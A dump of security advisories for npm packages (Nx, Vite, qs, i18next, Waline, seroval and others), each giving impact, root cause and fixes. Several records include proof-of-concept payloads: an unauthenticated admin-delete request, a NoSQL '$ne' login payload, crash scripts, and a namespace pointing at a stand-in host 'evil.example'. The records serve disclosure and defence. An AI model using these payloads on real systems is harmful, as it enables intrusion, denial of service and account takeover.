  console.log(`${digits} digits: ${((performance.now() - start) / 1000).toFixed(2)} s`);
}
```

Measured warm, i.e. after ordinary inputs have been validated like in a running server:

| digits | Node 22.19.0 | Node 26.10.0 |
|-------:|-------------:|-------------:|
| 24 | 0.10 s | 0.07 s |
| 26 | 0.41 s | 0.29 s |
| 28 | 1.63 s | 1.14 s |
| 30 | 6.59 s | 4.62 s |

The time doubles with every digit. The first execution of the regex in a fresh process is about 5x slower because V8 interprets a regexp on its first run (Node 22.19.0, 28 digits: 7.8 s).

2. Through graphql-js, no server and no authentication: a schema with a single `echo(phone: PhoneNumber)` field, 26 digits + `x`, Node 22.19.0, warm:

| | literal (`parseLiteral`, validation) | variable (`parseValue`, coercion) |
|---|---:|---:|
| graphql 16.14.2 | 0.41 s | 0.43 s |
| graphql 17.0.2 | 0.41 s | 0.83 s (evaluated twice) |

3. Also reproduced end to end against a GraphQL Yoga server: an anonymous HTTP request with a 27-digit value plus one invalid character stalled the whole process (a concurrent trivial `{ __typename }` request waited as long). A mutation that requires authentication was affected equally when called anonymously, because document validation runs before any authorization in resolvers or context.

## Impact

Denial of service. Any GraphQL server that exposes `PhoneNumber` on an argument, an input object field or a variable can be stalled by a request of about 30 characters; roughly 40 characters would keep a process busy for hours (extrapolated from the doubling, not measured). `serialize` uses the same regex, so unvalidated stored values returned through a `PhoneNumber` field are affected too. The actual severity depends on the scalar being applied to untrusted input, which is the typical case.

## Suggested fix

An equivalent pattern without ambiguous splits:

```js
const PHONE_NUMBER_REGEX = /^\+?\d{1,3}[- ]?\(?\d(?:\d*\))?(?:[- ]?\d)+$/;
```

It accepts exactly the same strings as the current one, so there is no behaviour change: with `N = (S?\d+)+ = (S?\d)+` a digit run is just repeated single-digit iterations, hence `\d+\)?N = \d(\d*\))?N`. Verification:

- exhaustive comparison of old and new pattern on every string up to length 9 over `1 + - space ( ) x`: 47,079,208 strings (1,832 accepted), 0 differences;
- every sequence of up to 6 tokens from `1 11 111 1111 11111 + - space ( ) x`: 1,948,717 strings (100,380 accepted), 0 differences;
- adversarial inputs (digit runs plus a failing character, digit/space and digit/dash alternations, parenthesis variants) scale linearly: 1,000,000 characters take about 10 ms, where the current pattern needs 0.3 s for 26.

Optionally also reject values above a sane length before matching; the grammar currently has no upper bound and E.164 allows at most 15 digits. Above roughly

advisories.name: @nx/maven and @nx/gradle have OS command injection via nx.json plugin options
advisories.description:
## Summary

`@nx/maven` and `@nx/gradle` spawn their project-graph analyzers through a shell and interpolate plugin options read from `nx.json` straight into the command line. Because a shell parses the whole line, an option value containing shell syntax is executed as a command by any `nx` command that constructs the project graph. Anyone who clones a hostile repository, or who checks out a pull request that edits `nx.json`, runs the injected command with their own privileges.

## Severity

A victim who runs an ordinary `nx` command in an attacker-supplied Maven or Gradle workspace gets code execution as themselves. In most such workspaces an attacker who can write `nx.json` can already run code through the repository's build files (`./mvnw`, `pom.xml`, and the Gradle equivalents), so the genuinely new exposure is narrow — for example CI building a fork's pull request where `nx.json` is writable but the build files are not. We have no evidence of exploitation in the wild.

## Affected & Patched Versions

| Package | Vulnerable | Patched |
| --- | --- | --- |
| `@nx/maven` | `>= 22.0.2, < 22.7.9`; `>= 23.0.0, < 23.1.2` | `22.7.9`, `23.1.2` |
| `@nx/gradle` | `>= 21.0.0, < 22.7.9`; `>= 23.0.0, < 23.1.2` | `22.7.9`, `23.1.2` |

> [!IMPORTANT]
> Workspaces that register neither `@nx/maven` nor `@nx/gradle` in `nx.json` are unaffected — the vulnerable code only runs from those plugins' graph-construction paths, and no other Nx plugin shares this pattern.

## Remediation

Upgrade to **22.7.9** (22.x line) or **23.1.2** (23.x line) or later:

```
nx migrate 23.1.2
```

Upgrade both `nx` and the affected plugin (`@nx/maven` and/or `@nx/gradle`). The plugin's fix depends on code that ships in the `nx` package, so bumping the plugin without a matching `nx` upgrade will not resolve it.

There is no configuration to change — upgrading is the whole fix. If you cannot upgrade yet, only run `nx` commands in repositories you trust, since a malicious `nx.json` can execute code on a vulnerable version.

## Details

Both plugins spawn their analyzer through a shell and interpolate `nx.json` plugin options into the command, so those option values are shell source. For Maven the injectable value is the `targetNamePrefix` option; for Gradle it is broader, since every plugin option is mapped into a `-P` argument and arbitrary option names are accepted, making both the name and value of any option injectable.

## Credits

- **Arkadiusz Marta** (RE:SOURCE) — Reporter

Vite: `server.fs.deny` bypassed with queries
advisories.description:
### Summary

The contents of files that are specified by [`server.fs.deny`](https://vite.dev/config/server-options#server-fs-deny) can be returned to the browser. This is the same as https://github.com/vitejs/vite/security/advisories/GHSA-v2wj-q39q-566r.

### Impact

Only apps that match the following conditions are affected:

- explicitly exposes the Vite dev server to the network (using `--host` or [`server.host` config option](https://vitejs.dev/config/server-options.html#server-host))
- the sensitive file exists in the allowed directories specified by [`server.fs.allow`](https://vite.dev/config/server-options#server-fs-allow)
- the sensitive file is denied with a pattern that matches a file by [`server.fs.deny`](https://vite.dev/config/server-options#server-fs-deny)

### Details

On the Vite dev server, files that should be blocked by `server.fs.deny` (e.g., `.env`, `*.crt`) can be retrieved with HTTP 200 responses when query parameters such as `?raw`, `?import&raw`, or `?import&url&inline` are appended.

For the fix for https://github.com/vitejs/vite/security/advisories/GHSA-rq7h-c2jc-7f22, v6.4.4 back-ported https://github.com/vitejs/vite/pull/20410. But while that PR requires https://github.com/vitejs/vite/pull/22160 for https://github.com/vitejs/vite/security/advisories/GHSA-v2wj-q39q-566r, https://github.com/vitejs/vite/pull/22160 wasn't back-ported together causing v6 vulnerable to https://github.com/vitejs/vite/security/advisories/GHSA-v2wj-q39q-566r.

advisories.name: @eeacms/volto-chatbot has Unauthenticated Danswer API Confused Deputy Proxy
advisories.description:
## Unauthenticated Danswer API Confused Deputy Proxy in @eeacms/volto-chatbot

### Summary

`@eeacms/volto-chatbot` exposes an Express middleware route (`**/_v1_da/**`) that accepts unauthenticated HTTP requests from any network client and proxies them to the configured upstream Danswer API, automatically attaching the server-side service credentials (`DANSWER_API_KEY` or session cookie). Because no authorization check, path allowlist, or method restriction is applied before the upstream request is issued, an unauthenticated attacker can invoke arbitrary Danswer API operations — including privileged admin endpoints — as the configured service account. This is a classic Confused Deputy attack: the Volto proxy acts as a deputy that carries credentials on behalf of the attacker.

### Details

The vulnerability is introduced across two source files in `@eeacms/volto-chatbot@2.0.3`.

**Route registration (`src/index.js:15`):**

```js
middleware.all('**/_v1_da/**', proxyMiddleware);
```

The wildcard pattern matches every HTTP method and any sub-path, and no authentication middleware is chained before `proxyMiddleware`. This means all requests reaching any `/_v1_da/` path are forwarded without any identity check.

**Unvalidated path extraction and upstream URL construction (`src/middleware.js:228-230`):**

```js
const path = req.url.replace('/_v1_da/', '/');
const reqUrl = `${process.env.DANSWER_URL || ''}/api${path}`;
```

The attacker-controlled `req.url` is transformed into the upstream Danswer path with a simple string replace. There is no allowlist of permitted paths, no restriction on HTTP methods, and no validation of the resulting URL. The attacker therefore fully controls which Danswer endpoint is called and with which HTTP method.

**Credential attachment and forwarding (`src/middleware.js:164`, `src/middleware.js:169`, `src/middleware.js:202`):**

```js
// Session-cookie path (line 164):
headers = { Cookie: cached_auth_cookie, ... }

// API-key path (line 169):
Authorization: 'Bearer ' + api_key,

// Sink — final upstream dispatch (line 202):
const response = await fetch(url, options, req.body);
```

After constructing the URL from attacker-supplied input, the middleware attaches the server-side Danswer credentials (either a cached login session cookie or a `Bearer` API key) and dispatches the request. The response from Danswer is then relayed back to the unauthenticated client.

**Complete data flow (source → sink):**

1. `src/index.js:15` — all `**/_v1_da/**` paths registered to `proxyMiddleware` with no auth guard (source: external HTTP request).
2. `src/middleware.js:228` — `req.url` used directly to derive the upstream path without allowlist.
3. `src/middleware.js:230` — attacker-controlled path appended to `${DANSWER_URL}/api`.
4. `src/middleware.js:164` / `src/middleware.js:169` — server-side session cookie or API key attached.
5. `src/middleware.js:202` — `fetch(url, options, req.body)` sends the fully-credentialed request to the Danswer backend (sink).

This vulnerability is present whenever the add-on middleware is installed and `DANSWER_API_KEY` or `DANSWER_USERNAME`/`DANSWER_PASSWORD` is configured — conditions required for normal, documented operation of the package.

### PoC

The following steps reproduce the vulnerability using the Docker-based test harness provided with this report.

**Prerequisites:**
- Docker installed
- Python 3 with the `requests` library

**Step 1 — Build the Docker image (from the `npmAI_719_eea__volto-chatbot/` parent directory):**

```bash
docker build \
  -f vuln-001/Dockerfile \
  -t vuln001-proxy \
  reports/npmAI_719_eea__volto-chatbot
```

The image packages the unmodified `src/middleware.js` from `@eeacms/volto-chatbot@2.0.3`, a minimal Express server that wires the vulnerable middleware, and an in-container mock Danswer server that echoes every received request as JSON. The environment variable `DANSWER_API_KEY=supersecret` is set to simulate a real deployment.

**Step 2 — Start the container:**

```bash
docker run --rm -d -p 3000:3000 --name vuln001-test vuln001-proxy
```

This launches both the Volto proxy (port 3000) and the mock Danswer server (port 18080) inside the container.

**Step 3 — Run the PoC exploit script:**

```bash
python3 vuln-001/poc.py 127.0.0.1 3000
```

**What the script does:**
1. Waits for the proxy to accept TCP connections.
2. Sends an unauthenticated `POST` request with a JSON body to the admin-only Danswer endpoint via the proxy:

```
POST http://127.0.0.1:3000/_v1_da/admin/users/delete
Content-Type: application/json

{"id": "victim-user-123"}
```

No `Authorization` or `Cookie` header is sent by the client.

**Expected output (exploit confirmed):**

```
[+] === EXPLOIT CONFIRMED — PASS ===
[+] Decisive evidence:
    1. Attacker-controlled path reached upstream : url='/api/admin/users/delete'
    2. Server-side API key forwarded (no client auth) : authorization='Bearer supersecret'
    3. Attacker-controlled HTTP method forward

@sylphx/pdf-reader-mcp: HTTP transport accepts unauthenticated requests despite a configured MCP_API_KEY
advisories.description:
### Impact

When `@sylphx/pdf-reader-mcp` is run as an HTTP server (`MCP_TRANSPORT=http`), it reads the `MCP_API_KEY` environment variable and logs `API key authentication enabled (X-API-Key header)` at startup, but it never validated the `X-API-Key` header on incoming requests. The key was read into a variable and never enforced on the request path.

As a result, the `/mcp` endpoint accepted **unauthenticated** requests. Combined with the default bind address of `0.0.0.0` (all interfaces), any client able to reach the port could invoke every PDF tool and read the contents of any PDF the server process could open anywhere on the host. URL-based sources also enable limited SSRF (private/loopback addresses are blocked by default unless `--allow-private-ips` is set).

The misleading startup log made the exposure silent: an operator who set `MCP_API_KEY` reasonably believed the server was protected when it was not.

This affects only the opt-in HTTP transport; the default `stdio` transport is unaffected.

### Patches

Fixed in `@sylphx/pdf-reader-mcp@3.0.1`. The fix enforces the `X-API-Key` header with a constant-time comparison (rejecting missing/mismatched keys with HTTP 401), changes the default bind host to `127.0.0.1` (loopback), and emits a startup warning when binding a non-loopback host without an API key.

### Workarounds

For deployments that cannot upgrade immediately:

- Bind to loopback only: `MCP_HTTP_HOST=127.0.0.1`.
- Place a reverse proxy in front that enforces authentication.
- Use the default `stdio` transport instead of HTTP.
- Restrict filesystem reach with `--allow-dir` / `MCP_PDF_ALLOWED_DIRS`.

Reported privately by **novice-22** via responsible disclosure.

advisories.name: Parse Server vulnerable to stored XSS via malformed Content-Type bypassing file upload extension blocklist
advisories.description:
### Impact

Parse Server's file upload validation uses the `fileUpload.fileExtensions` option (enabled by default with a blocklist) to reject files that browsers may render as active content, mitigating stored cross-site scripting (XSS). When an uploaded file's extension is not recognized by the `mime` package, Parse Server preserves the client-supplied `Content-Type` and passes it to the storage adapter. A malformed `Content-Type` that is not a valid `type/subtype` media type — for example `image` (no subtype), `image/` (empty subtype), or `image//svg+xml` (invalid token) — bypassed the blocklist and was stored unchanged. On storage adapters that persist and serve the uploaded `Content-Type` (such as Amazon S3, Google Cloud Storage, or Azure Blob Storage), a browser cannot parse the malformed `Content-Type` and falls back to MIME-sniffing the file content; a file whose body begins with HTML markup is then rendered as HTML, executing any embedded script in the application's origin. This allows a user permitted to upload files to store content that executes as script against other users who open the file URL. The default GridFS storage adapter is not affected, as it recomputes the `Content-Type` from the filename and serves files with `X-Content-Type-Options: nosniff`.

### Patches

The file upload handler now validates that the client-supplied `Content-Type` is a well-formed media type (`type/subtype` with non-empty tokens per RFC 9110 §5.6.2) whenever the filename extension is not recognized by `mime`. Malformed values are rejected instead of being stored, while well-formed types — including custom or vendor types that the `mime` package does not recognize — continue to be accepted; only blocklisted subtypes are rejected.

### Workarounds

Configure `fileUpload.fileExtensions` as a strict allowlist of only the extensions the application needs (for example `["^(png|jpe?g|gif|pdf)$"]`). Additionally, serve uploaded files from a domain separate from the application so that any rendered content is isolated from the application's origin, and configure the storage/CDN layer to send `X-Content-Type-Options: nosniff`.

### References

- GitHub security advisory: https://github.com/parse-community/parse-server/security/advisories/GHSA-r899-h629-j84r
- Fix Parse Server 9: https://github.com/parse-community/parse-server/pull/10521
- Fix Parse Server 8: https://github.com/parse-community/parse-server/pull/10523

advisories.name: qs : qs.stringify with arrayFormat 'comma' throws an uncaught TypeError on array elements carrying a non-callable own toString (DoS)
advisories.description:
## Summary

`qs.stringify(obj, { arrayFormat: 'comma' })` throws an uncaught `TypeError: Cannot convert object to primitive value` when an array in `obj` contains an element that carries an own, non-callable `toString` property (for example `{ a: [ { toString: 'x' } ] }`). A remote, unauthenticated attacker who can influence an object that the application later re-serializes with the comma array format triggers the throw. In a service that lacks a synchronous error boundary around the serialization call, the uncaught exception crashes the worker process, producing a denial of service.

## Root Cause

When `arrayFormat: 'comma'` is selected, the comma branch collapses the whole array into a single value via `Array.prototype.join`, or, under `encodeValuesOnly: true`, maps each element through the value encoder before joining. Both paths perform an implicit string coercion (`ToPrimitive` with hint `"string"`) on each element. For an object whose own `toString` is a non-callable value, coercion skips the shadowed non-callable `toString`, falls through to `Object.prototype.valueOf` (which returns the object rather than a primitive), and throws. The comma branch runs this coercion before the per-element null and skip handling in the main loop, so nothing downstream can neutralize the hostile element, and the throw is never caught inside the library.

```text
lib/stringify.js  (comma-array branch)
  line 152-154: obj = utils.maybeMap(obj, function (v) { return v == null ? v : encoder(v); });  // encodeValuesOnly path
  line 156:     objKeys = [{ value: obj.length > 0 ? obj.join(',') || null : void undefined }];   // default comma path
lib/utils.js
  line 292:     string = String(str);   // value encoder coercion reached via the encodeValuesOnly path
```

## Impact

Prerequisites: the application calls `qs.stringify` with `arrayFormat: 'comma'` (a documented, supported option) on an object whose shape can be influenced by attacker input. Attacker-controllable sources include `qs.parse(input, { allowPrototypes: true })`, which retains a `toString` segment (Express 4's default query parser, Express 5's `extended` query parser, and body-parser's `extended` urlencoded parser all set it), `qs.parse(input, { plainObjects: true })`, whose null-prototype elements throw even without a `toString` key (eg, `a[][b]=c`), and `JSON.parse` of a request body, which needs no qs parse option at all. No authentication or user interaction is required. Demonstrated capability: a single request forces an uncaught synchronous `TypeError` in the serialization call. In a naive single-process Node service with no synchronous error boundary, this crashes the process and takes the service offline (availability impact). Under a framework such as Express that traps synchronous handler throws, the plausible outcome is a per-request 500 rather than a full outage; that lower-impact case is noted but not the worst credible supported deployment. There is no confidentiality or integrity impact, no memory unsafety, and no prototype pollution.

## Proof of Concept

`Install qs at the affected version (for example 6.16.0) and run the following script with Node.js. No network setup is required; it demonstrates the throw in isolation.`

```js
var qs = require('qs');

// Source A: qs.parse with allowPrototypes retains the hostile toString segment
qs.stringify(qs.parse('a[0][toString]=x', { allowPrototypes: true }), { arrayFormat: 'comma' });

// Source B: a JSON request body, no qs parse option needed
qs.stringify(JSON.parse('{"a":[{"toString":"x"}]}'), { arrayFormat: 'comma' });

// Also affected: the encodeValuesOnly sub-path
qs.stringify(JSON.parse('{"a":[{"toString":"x"}]}'), { arrayFormat: 'comma', encodeValuesOnly: true });
```

```text
A default-join (allowPrototypes) => THREW: TypeError: Cannot convert object to primitive value
B default-join (JSON.parse) => THREW: TypeError: Cannot convert object to primitive value
C encodeValuesOnly path => THREW: TypeError: Cannot convert object to primitive value
N2 callable toString => NO THROW; output="a=z"
N3 isBuffer vector (CVE-2026-82417) => NO THROW; output="a%5Bconstructor%5D%5BisBuffer%5D=x"
qs version: 6.16.0
```

## Attack Chain

1. **Exposure:** A remote, unauthenticated request reaches an endpoint whose handler eventually serializes attacker-influenced data with `qs.stringify(obj, { arrayFormat: 'comma' })`.
2. **Control:** The attacker supplies data that becomes `{ a: [ { toString: <non-callable value> } ] }`, either via `a[0][toString]=x` parsed with `allowPrototypes`, or via a JSON body `{"a":[{"toString":"x"}]}`.
3. **Path:** In `stringify`, the primitive/buffer guard at `lib/stringify.js:134` is false for an array, so control reaches the comma branch at `lib/stringify.js:149`.
4. **Guard:** On the `encodeValuesOnly` path, the closure `v == null ? v : encoder(v)` at `lib/stringify.js:152-154` passes only `null`/`undefined` through; a non-null object still reaches the encoder. The default path s

advisories.name: i18next-http-backend: Namespace value starting with / forms a protocol-relative URL when loadPath/addPath places {{ns}} right after a / (bypass of the // check added for GHSA-xvq9-wjp8-hwqf)
advisories.description:
## Affected versions
Verified on 4.0.2 (latest on npm) and on commit 07e0288 (the GHSA-xvq9-wjp8-hwqf fix). Earlier 3.x/4.x versions that allow `/` in ns are likely affected too. Not verified on them.

## Impact
Same class as GHSA-xvq9-wjp8-hwqf and GHSA-q89c-q3h5-w34g: when an attacker controls the namespace value, the request goes to an attacker-chosen origin. In a browser this loads attacker-controlled translation JSON (content injection into the UI, and XSS where translations are rendered as HTML). The precondition is a template with `{{ns}}` right after a leading `/`, for example `/{{ns}}/{{lng}}.json`. The 4.0.2 maintainer note says templates with a leading `/` are safe. This case is outside that statement.

## Root cause
`isSafeNsUrlSegment` rejects any ns containing `//`, but allows a single leading `/` (needed for nested namespaces like `a/b`). Interpolation into `/{{ns}}/...` puts the template's own `/` next to the value's `/`. The result starts with `//`, which is a protocol-relative URL. The check runs on the value, not on the final URL.

## Minimal PoC
```js
import Backend from 'i18next-http-backend'
const b = new Backend(null, { loadPath: '/{{ns}}/{{lng}}.json',
  request: (opts, url, payload, cb) => { console.log(url, '->', new URL(url, 'https://app.example/').origin); cb(null, { status: 200, data: '{}' }) } })
b.read('en', '/evil.example', () => {})
```
Observed on 4.0.2:
```
POC ns=/evil.example  loadPath=/{{ns}}/{{lng}}.json => url=//evil.example/en.json  origin in page https://app.example/ = https://evil.example
```

## Negative controls (same run)
- ns `//evil.example`: rejected ("unsafe lng/ns value").
- lng `http:127.0.0.1:9` (the GHSA-xvq9 payload): rejected.
- ns `common` and nested ns `a/b`: `common/en.json` and `a/b/en.json`, same origin.

## Suggested fix
Validate the final interpolated URL, not just the values: reject it if it starts with `//` or `\`, or if it has a scheme or host the template did not have. The advisory already recommends this ("parse the final URL and require it to remain within the intended origin and path"). Alternatively, reject an ns that starts with `/`.

## Disclosure
We intend to keep this private for 90 days from the date of the report, or until a fixed release is available, whichever comes first, and are happy to adjust if you need more time.

## Re-verification
Re-run on 2026-10-14 against the same latest release. The PoC still reproduces and the negative controls still hold.

Reported by Zachariah Mithani.

## Maintainer note

Confirmed and fixed in 4.0.3 (commit i18next/i18next-http-backend@042c3d4).

**Preconditions.** The `loadPath` / `addPath` template must put `{{ns}}` directly after a leading `/` (for example `/{{ns}}/{{lng}}.json`), and the attacker must control the namespace value. Applications usually set namespaces in code rather than from user input. The default `/locales/{{lng}}/{{ns}}.json`, templates with an origin, and templates with a fixed path segment before `{{ns}}` are not affected. Only browsers are affected: in Node, `fetch('//host/...')` fails because there is no base URL to resolve against. XSS additionally requires the application to render translations as HTML.

**Fix.** The 4.0.2 `//` check looked at each value on its own and could not see the `/` the template puts in front of it. `interpolateUrl` now also checks the interpolated URL: it may only start with `//` or `\` if the template itself does. Protocol-relative CDN templates such as `//cdn.example/{{lng}}/{{ns}}.json` keep working.

**Affected range.** Versions before 3.0.5 had no value validation at all and are reachable through this vector too, so the affected range is `< 4.0.3`.

**Related.** i18next-fs-backend had the same class of problem for file paths (a leading `/` in `ns`, or `C:` in `lng`, changing the root of a path built from a template that starts with the placeholder). It is fixed in i18next-fs-backend 2.6.9.

advisories.name: systeminformation vulnerable to Windows command injection in services() through Unicode quotation marks
Backstage catalog rules can be bypassed for URL locations using encoded path segments
advisories.description:
## Summary

`@backstage/plugin-catalog-backend` matches URL-type locations against `catalog.rules` location patterns using the raw URL string submitted by the user, while URL readers resolve that same string in canonical form when fetching the location's content. A URL can therefore be crafted so that it appears to belong to a trusted location scope during rule evaluation, but is fetched from a different scope.

## Details

When a deployment restricts catalog kinds to trusted URL prefixes using `catalog.rules` location patterns, `DefaultCatalogRulesEnforcer` applies glob matching directly to the raw `location.target` string. The URL readers used for ingestion resolve the same target in canonical form, including normalizing percent-encoded dot segments. A registered location such as `https://<host>/trusted/%2e%2e/attacker/repo/blob/main/catalog-info.yaml` matches a `https://<host>/trusted/**` pattern as a raw string, but resolves to and is fetched from `https://<host>/attacker/repo/...` when its content is read.

An authenticated user with permission to register catalog locations (`catalog.location.create`) can use this to have an entity from an untrusted source admitted as if it originated from a trusted location scope.

## Impact

The crossed boundary is the operator-configured catalog ingestion policy: entity content from outside the trusted location scope is ingested as if it were within it. Downstream consequences depend on deployment configuration, for example actions taken with integration credentials by processors or scaffolder when acting on the ingested entity. The assessment of this report found no basis for impact claims beyond the ingestion policy boundary itself.

## Patches

This is fixed in `@backstage/plugin-catalog-backend` 3.9.2 (Backstage release 1.54.10) and 4.0.2 (Backstage release 1.56.1). Version 4.0.1 as published is not fixed.

## Workarounds

No complete workaround is available for deployments that rely on URL location patterns to restrict catalog kinds. Restricting location registration permissions reduces exposure.

advisories.name: Waline login accepts a non-string email as a match-all MongoDB query
advisories.description:
## Summary

The login endpoint POST /api/token reads the `email` field from the request body without checking its type and passes it straight into the MongoDB storage query. When `email` is not a string (for example a JSON object such as {"$ne": null}), the MongoDB storage adapter's parseWhere silently DROPS the field rather than rejecting the request, producing an empty filter that matches ALL users. The endpoint then verifies the submitted password against the FIRST user returned (user[0]), which in Waline is the first-registered user — the site administrator.

This is a PARTIAL authentication bypass, not a full one. The attacker still needs a valid password for that first user; this is not a zero-knowledge bypass and it does not disclose passwords. Its concrete effects are: (1) the email/identifier factor is removed for the administrator account, (2) user enumeration (a non-string email never fails the "no such user" branch), and (3) credential-stuffing amplification — an attacker can test a leaked or weak password against the administrator account without knowing the administrator's email.

## Details

Untyped input — packages/server/src/controller/token.js:17-18:
```
    const { email, password, code } = this.post();
    const user = await this.modelInstance.select({ email });
````
`email` comes from the request body with no type check.

The storage adapter silently drops a non-string key — packages/server/src/service/storage/mongodb.js, parseWhere():
```
    if (think.isString(where[k])) { filter[parseKey(k)] = { $eq: ... }; continue; }   // intended guard
    if (where[k] === undefined) { ... }
    if (Array.isArray(where[k]) && where[k][0]) { ... operator handling (IN/LIKE/!=/> ...) }
```
A plain object such as {"$ne": null} is neither a string, undefined, nor an array, so NONE of the branches run and nothing is added to `filter` for `email`. The result is filter = {} -> instance.where({}) -> MongoDB find({}) returns every user. (The array form, e.g. ["!=", ""], is a genuine operator injection that reaches $ne with the same match-all effect.)

First user is selected — token.js:22-26:
```
    if (think.isEmpty(user) || isVerifyUser || isBannedUser) { return this.fail(); }   // match-all -> not empty -> passes
    const checkPassword = this.checkPassword(password, user[0].password);
```
user[0] is the first record in MongoDB natural (insertion) order, i.e. the earliest-registered user, which in Waline is the administrator.

No upstream type validation — packages/server/src/logic/token.js:37-38:
```
    async postAction() { await this.useCaptchaCheck(); }
```
The only pre-check is the captcha; there is no isString(email/password) validation.

## Proof of Concept

Send a login request whose email is a non-string value:
```
    POST /api/token  HTTP/1.1
    Content-Type: application/json

    {"email": {"$ne": null}, "password": "<password-to-test>"}
```
- Because `email` is not a string, parseWhere adds nothing for it, so the query filter is {} and MongoDB returns all users.
- user[0] — the first-registered user, i.e. the administrator — is selected, and the submitted password is checked against the administrator's hash.
- If the password matches (for example via credential stuffing or a known/weak password), the attacker is authenticated as the administrator without ever knowing the administrator's email.
- Even when the password does not match, the request confirms that users exist (enumeration) and that the email factor is bypassable.

## Impact

An unauthenticated attacker can bypass the email/identifier factor of authentication for the first-registered user (the administrator) and have an arbitrary password checked directly against that account. This:
- enables user enumeration;
- amplifies credential stuffing against the administrator (no need to know the admin email — a leaked or weak password can be tested directly);
- and, when the attacker possesses a valid password for that account (e.g. a reused/breached one), results in administrator login.

This is bounded: it is NOT a zero-knowledge authentication bypass, it does NOT reveal passwords, and it targets the first-returned user rather than an arbitrary chosen account. It is rated Medium accordingly. (If exploitation succeeds in logging in, the attacker then holds the administrator session; that downstream impact is conditional on already having a valid password, which is reflected in the High attack complexity rather than in the confidentiality/integrity metrics.)

## Remediation

Validate the types of `email` and `password` as strings before they reach the storage query — for example in packages/server/src/logic/token.js postAction():
```
    const { email, password } = this.post();
    if (!think.isString(email) || !think.isString(password)) {
      return this.ctx.throw(400, 'Invalid input type');
    }
```
Defense in depth: in mongodb.js parseWhere(), reject (rather than silently drop) a value that is neither a string nor a supported array

advisories.name: Seroval: Code injection through a typed array's own constructor property
advisories.description:
### Summary

seroval writes a typed array as a call to its constructor. In affected versions, the constructor name in the output is read from a property that data on the value can replace, and it is written without checks. A typed array that received properties from untrusted data can then put arbitrary code into the serialized output.

### Details

Version 1.6.0 changed how seroval finds the class of an object, so that objects with their own `constructor` property serialize correctly. Typed arrays still took the constructor name from the value itself, so the name could come from the untrusted property instead of the array's real type.

These functions are affected:

- `serialize`, `serializeAsync`
- `crossSerialize`, `crossSerializeAsync`, `crossSerializeStream`
- the `Serializer` class
- `compileJSON`

`fromJSON` and `fromCrossJSON` are not affected: they only accept the names of the built-in typed arrays. With the `compactArrayBufferViews` option, the same lookup throws a `TypeError` instead of writing code.

### Impact

An application is affected only when it serializes a typed array that has an own `constructor` property set from untrusted data. That requires code that copies properties from untrusted objects onto a typed array. This is unusual, so the severity is rated Low, even though the result is script execution in the page that receives the output.

### Patches

Fixed in 1.6.11. The constructor name now comes from the array's internal type, which properties on the value cannot change. `compactArrayBufferViews` uses the real type as well.

### Workarounds

If you cannot upgrade, do not copy properties from untrusted objects onto typed arrays, or remove an own `constructor` property from a typed array before serializing it.

advisories.name: Seroval: Script injection through RegExp sources in serialized output
advisories.description:
### Summary

seroval writes a `RegExp` as a regular expression literal. In affected versions, the `<` character in a `RegExp` source is written without escaping. A source built from untrusted input can then end the HTML `<script>` element that the serialized output is placed in, and run script in the page.

### Details

seroval escapes `<` in strings, so string values cannot end a `<script>` element. `RegExp` sources did not get the same escaping:

- Versions before 1.0.0 wrote the source as is.
- Version 1.5.5 stopped escaping `<` in `RegExp` sources, so that named groups and lookbehinds keep working. This removed the escaping for every `<` in a source.

These functions are affected:

- `serialize`, `serializeAsync`
- `crossSerialize`, `crossSerializeAsync`, `crossSerializeStream`
- the `Serializer` class
- `compileJSON`

`toJSON`, `fromJSON`, `toCrossJSON` and `fromCrossJSON` are not affected, because they never produce JavaScript.

### Impact

An application is affected when all of these are true:

1. It builds a `RegExp` from untrusted input that is used as regular expression syntax. Input passed through an escaping helper (such as an `escapeRegExp` function) is not enough to exploit this.
2. It serializes that `RegExp` with one of the functions above.
3. It places the output inside an HTML `<script>` element, as server rendering usually does.

In that case an attacker can run script in the page of any user who receives that output.

### Patches

Fixed in 1.6.10. A `RegExp` whose source contains `<` is now written with the `RegExp` constructor and an escaped string source. Named groups and lookbehinds keep working.

### Workarounds

If you cannot upgrade:

- Do not serialize a `RegExp` built from untrusted pattern syntax. Send its source and flags as strings, and build the `RegExp` on the client.
- Or reject patterns that contain `<` before they reach the serializer.

advisories.name: Seroval: fromJSON deserializer trusts node-supplied array length and sequence doneAt (unauthenticated event-loop DoS)
advisories.description:
### Summary

`fromJSON` and `fromCrossJSON` used two node fields without checking them.

- An array node's element list was not checked to be an array. A small payload could set the length the decoder looped over. This part is also tracked in GHSA-wp97-x4hv-qvhp.
- A sequence node's done index was not checked. A crafted value produced an iterator that never finished.

### Impact

A service that passes untrusted input to `fromJSON` or `fromCrossJSON` can be made unavailable by an unauthenticated request.

- The array case blocks the thread while the decoder runs.
- The sequence case makes any code that reads the resulting iterator to the end run forever.

### Patches

Fixed in `seroval@1.6.8`.

- Element lists must be arrays.
- A sequence node's throw and done indices must be integers from -1 up to the last element index.

Invalid input throws `SerovalMalformedNodeError`.

### Workarounds

None. Upgrade to 1.6.8.

advisories.name: Seroval `fromJSON`/`fromCrossJSON` denial of service via unvalidated array node length
advisories.description:
### Summary

`fromJSON` and `fromCrossJSON` did not check that an array node's element list is an array. A small crafted payload could set the length the decoder used. That length controlled how much memory was allocated and how many times the decoder looped, and it did not depend on the size of the payload.

### Impact

A service that passes untrusted input to `fromJSON` or `fromCrossJSON` can be made unavailable by an unauthenticated request.

- A small payload can allocate enough memory to end the process.
- A small payload can block the thread for seconds, or without end.

This affects any framework that decodes request bodies with these functions before its own validation runs.

This issue is a bypass of the fix for GHSA-66fc-rw6m-c2q6 in 1.4.1.

### Patches

Fixed in `seroval@1.6.8`. The deserializer now rejects any node whose element list is not an array, and throws `SerovalMalformedNodeError`.

### Workarounds

None. Upgrade to 1.6.8.

advisories.name: Seroval: Deserialization invokes attacker-chosen callables: AsyncIteratorFactoryInstance calls source.on(listener) without type check
advisories.description:
### Summary

When `fromJSON` rebuilt an async iterator, it called `on()` on the iterator's source without checking that the source was a seroval stream. A crafted payload could pick another value as the source, such as a function returned by an application plugin. The deserializer then called that value's `on` method.

This is a variant of GHSA-mv8w-475r-vwqw. That fix covered the promise and stream control nodes but not the async iterator node.

### Impact

An application that passes untrusted input to `fromJSON` with plugins that return callable values can have those callables invoked during deserialization. What this allows depends on what the plugin's values do.

### Affected versions

- Versions up to 1.6.3 accept any value as the source.
- 1.6.4 rejects the reported payload.
- 1.6.5 to 1.6.7 check the source by node type, which a payload can get around by reusing a node id.
- All versions up to 1.6.7 should be treated as affected.

### Patches

